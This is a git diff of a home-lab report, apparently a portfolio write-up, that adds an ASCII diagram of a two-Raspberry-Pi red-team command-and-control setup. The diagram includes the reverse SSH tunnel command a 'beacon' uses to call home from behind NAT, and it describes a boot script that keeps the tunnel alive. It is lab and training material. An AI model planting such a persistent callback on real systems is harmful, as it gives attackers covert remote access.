@@ -198,7 +198,36 @@ All implemented on low-cost hardware following industry-aligned VLAN practices.
 
 
 
-# 📘 **Persistent Reverse SSH Command-and-Control Infrastructure — Lab Report: Establishing Red Team Connectivity**
+## 📘 **Persistent Reverse SSH Command-and-Control Infrastructure — Lab Report: Establishing Red Team Connectivity**
++--------------------------------------------------------------+
+|                        Pi 4 — C2 Server                      |
+|--------------------------------------------------------------|
+| Hostname: c2                                                 |
+| IP: 10.0.31.100                                              |
+|                                                              |
+| Listens on reverse SSH port:                                 |
+|     ssh bruce@localhost -p 2222                              |
+|                                                              |
+| Provides operator access → SOC → Elastic → Log Review        |
++---------------------------▲----------------------------------+
+                            │
+                            │ Reverse SSH Tunnel (persistent)
+                            │ Established OUTBOUND from Pi 3
+                            │
++---------------------------┴----------------------------------+
+|                      Pi 3 — Beacon ("fob")                   |
+|--------------------------------------------------------------|
+| Lives behind NAT (no inbound accessibility)                  |
+|                                                              |
+| Calls home using:                                            |
+|     ssh -N -R 2222:localhost:22 bruce@10.0.31.100            |
+|                                                              |
+| reverse-tunnel.sh runs at boot:                              |
+|   - sleep 60 (network wait)                                  |
+|   - retry loop                                               |
+|   - auto heal                                                |
++--------------------------------------------------------------+
+
 
 ## **1. Purpose**
 
